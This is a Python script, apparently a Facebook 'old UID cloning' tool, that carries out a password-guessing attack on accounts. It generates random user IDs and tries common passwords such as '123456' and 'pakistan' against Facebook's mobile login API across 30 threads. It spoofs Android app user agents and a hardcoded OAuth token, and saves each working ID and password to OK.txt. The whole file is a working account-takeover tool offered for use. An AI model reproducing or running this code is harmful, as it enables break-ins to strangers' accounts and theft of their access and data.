#!/usr/bin/python3
#-*-coding:utf-8-*-

P = '\x1b[1;97m'
M = '\x1b[1;31m'
H = '\x1b[1;32m'
K = '\x1b[1;33m'
B = '\x1b[1;34m'
U = '\x1b[1;35m' 
O = '\x1b[1;36m'
N = '\x1b[0m' 
Z = "\033[1;30m"
W = '\x1b[1;37m'
Y = '\x1b[1;33m'
G = '\x1b[1;32m'
rad = '\x1b[1;31m'

import os
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	import bs4
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize bs4 requests futures==2 > /dev/null')
	os.system('python uidcr3k.py')

import requests,json,os,sys,random,datetime,subprocess,time,re,calendar,base64,zlib,string,platform,uuid
from bs4 import BeautifulSoup as sop

loop = 0
oks = []
cps = []
tred = ThreadPool

def xox(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)

def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith(('1000000000', '1000000001')): return '2006'
        if uid.startswith(('1000000002', '1000000003')): return '2007'
        if uid.startswith(('1000000004', '1000000005')): return '2008'
        if uid.startswith('1000000000'): return '2009'
        if uid.startswith('100000000'): return '2009'
        if uid.startswith('10000000'): return '2009'
        if uid.startswith(('1000000', '1000001', '1000002', '1000003', '1000004', '1000005')): return '2009'
        if uid.startswith(('1000006', '1000007', '1000008', '1000009')): return '2010'
        if uid.startswith('100001'): return '2010'
        if uid.startswith(('100002', '100003')): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith(('100005', '100006')): return '2013'
        if uid.startswith(('100007', '100008')): return '2014'
        if uid.startswith('100009'): return '2015'
        if uid.startswith('10001'): return '2016'
        if uid.startswith('10002'): return '2017'
        if uid.startswith('10003'): return '2018'
        if uid.startswith('10004'): return '2019'
        if uid.startswith('10005'): return '2020'
        if uid.startswith('10006'): return '2021'
        if uid.startswith('10009'): return '2023'
        if uid.startswith(('10007', '10008')): return '2022'
        return ''
    elif len(uid) in (9, 10): return '2008'
    elif len(uid) == 8: return '2007'
    elif len(uid) == 7: return '2006'
    elif len(uid) == 14 and uid.startswith('61'): return '2024'
    else: return ''

def ____banner____():
	os.system("clear")
	print("")
	print(f" {M}█████╗ ██████╗ ███████╗ █████╗ ██╗      █████╗ ███╗   ██╗")
	print(f" {M}██╔══██╗██╔══██╗██╔════╝██╔══██╗██║     ██╔══██╗████╗  ██║")
	print(f" {M}███████║██████╔╝███████║███████║██║     ███████║██╔██╗ ██║")
	print(f" {M}██╔══██║██╔══██╗╚════██║██╔══██║██║     ██╔══██║██║╚██╗██║")
	print(f" {M}██║  ██║██║══██║███████║██║  ██║███████╗██║  ██║██║ ╚████║")
	print(f" {M}╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝")
	print(f"{Z}╔══════════════════════════════════════════╗")
	print(f"{Z}║{B}  OWNER    : {H}ARSALN x ARSALAN KHAN         {Z}║")
	print(f"{Z}║{B}  [=] FACEBOOK : {H}ARSALAN-TOOL                  {Z}║")
	print(f"{Z}║{B}  [=] WHATSAP  : {H}03202271931              {Z}║")
	print(f"{Z}║{B}  FEATURE  : {H}OLD CLONING                   {Z}║")
	print(f"{Z}║{B}  [=] VERSION  : {H}v13.5                     {Z}║")
	print(f"{Z}╚══════════════════════════════════════════╝")
	print("")

def linex():
	print('\x1b[38;5;48m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m')

def result(OK):
	if len(OK) != 0:
		print("\n\n\033[94;1m THE PROCESS HAS BEEN COMPLETED")
		print("\033[93;1m TOTAL \033[92;1mOK: %s"%(str(len(OK))))
		os.sys.exit()
	else:
		print('\n\n [%s!%s] NO RESULT YOUR BAD LOCK :(:('%(H,H));exit()

def arsalanvau():
	os.system('clear')
	____banner____()
	print(f' {H}[1] OLD UID CLONING (2009-2014)')
	print(f' {M}[B]BACK\n')
	opt = input(f'{B} CHOOSE : {H}')
	if opt =='1':
		BNG_71_()
	else:
		print('\n\033[1;31m CHOOSE A VALID OPTION\033[0;97m')

def BNG_71_():
    ____banner____()
    print(f'       {M}({W}A{M}){W}{H}OLD CLONE')
    linex()
    __Jihad__ = input(f"       {M}{W}{H}CHOICE  {W}: {Y}")
    if __Jihad__ in ('A', 'a', '01', '1'):
        old_One()
    else:
        print(f"\n    {rad}Choose Valid Option... ")
        time.sleep(2)
        BNG_71_()

def old_One():
    user = []
    ____banner____()
    print(f"       {W}Old Code {Y}:{G} 2010-2014")
    ask = input(f"       {H}SELECT (1/2) {Y}:{G} ")
    linex()
    ____banner____()
    print(f"       {M}({W}★{M})>×< {H}EXAMPLE {Y}:{G} 20000 / 30000 / 99999")
    limit = int(input(f"       {M}({W}★{M})>×< {H}SELECT {Y}:{G} "))
    linex()
    star = '10000'
    for _ in range(limit):
        data = ''.join(random.choices(string.digits, k=9))
        user.append(star + data)
    print(f'        {M}({W}A{M})>×<{H}METHOD 1')
    print(f'       {M}({W}B{M})>×<{H}METHOD 2')
    linex()
    meth = input(f"       {M}({W}★{M})>×<{H}CHOICE {W}(A/B): {Y}").strip().upper()
    with tred(max_workers=30) as pool:
        ____banner____()
        print(f"       {M}({W}★{M})>×<{H}TOTAL ID FROM CRACK {Y}: {G} {limit}{W}")
        print(f"       {M}({W}★{M})>×<{H}USE AIRPLANE MOD FOR GOOD RESULT{G}")
        linex()
        for uid in user:
            if meth in ('A', 'B'):
                pool.submit(cracker, uid)
            else:
                print(f"    {rad}[!] INVALID METHOD SELECTED")
                break
    result(oks)

def cracker(user):
	global loop
	global oks
	global cps
	pwx = ['123456789', '123456', '12345', '1234', 'password', 'khan123', 'pakistan']
	try:
		for pw in pwx:
			ses=requests.Session()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			fbs=random.choice(['com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite'])
			gtt=random.choice(['GT-I9190','KOT49H','SM-G532F','SM-G920F','SM-G935F','SM-J320F'])
			gttt=random.choice(['GT-I9190','KOT49H','SM-G532F'])
			android_version=str(random.randrange(6,13))
			ua_string = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.5,width=480,height=800}'+f';FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
			adid = str(uuid.uuid4())
			data = {
				"adid": adid,
				"email": user,
				"password": pw,
				"cpl": "true",
				"credentials_type": "device_based_login_password",
				"source": "device_based_login",
				"error_detail_type": "button_with_disabled",
				"source": "login", "format": "json",
				"generate_session_cookies": "1",
				"generate_analytics_claim": "1",
				"generate_machine_id": "1",
				"locale": "pl_PL", "client_country_code": "PL",
				"device": gtt,
				"device_id": adid,
				"method": "auth.login",
				"fb_api_req_friendly_name": "authenticate",
				"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"
			}
			head = {
				"content-type": "application/x-www-form-urlencoded",
				"x-fb-sim-hni": str(random.randint(2e4,4e4)),
				"x-fb-connection-type": "unknown",
				"Authorization": "OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32",
				"user-agent": ua_string,
				"x-fb-net-hni": str(random.randint(2e4,4e4)),
				"x-fb-connection-bandwidth": str(random.randint(2e7,3e7)),
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-friendly-name": "authenticate",
				"accept-encoding": "gzip, deflate",
				"x-fb-http-engine": "Liger"
			}
			xnxx = ses.post("https://b-api.facebook.com/method/auth.login", data=data, headers=head, allow_redirects=False).text
			result_json = json.loads(xnxx)
			
			if "session_key" in result_json:
				yug = creationyear(user)
				if yug == '':
					yug = 'Unknown'
				print(f'\033[1;32m (AHB) = {user} = {pw} = {yug}\033[0;97m')
				open('OK.txt', 'a').write(user+'|'+pw+' | Year: '+yug+'\n')
				oks.append(user)
				break
			elif "www.facebook.com" in result_json:
				cps.append(user)
				break
			else:
				continue
		
		loop += 1
		sys.stdout.write(f"\r\033[1;31m+(\033[1;37mAHB-M1\033[1;31m)\033[1;37m(\033[1;33m{loop}\033[1;37m)\033[1;31m(\033[1;32m{len(oks)}\033[1;31m)\033[1;37m(\033[1;31m{len(cps)}\033[1;37m)\r")
		sys.stdout.flush()

	except Exception as e:
		loop += 1
		pass

if __name__=='__main__':
	arsalanvau()
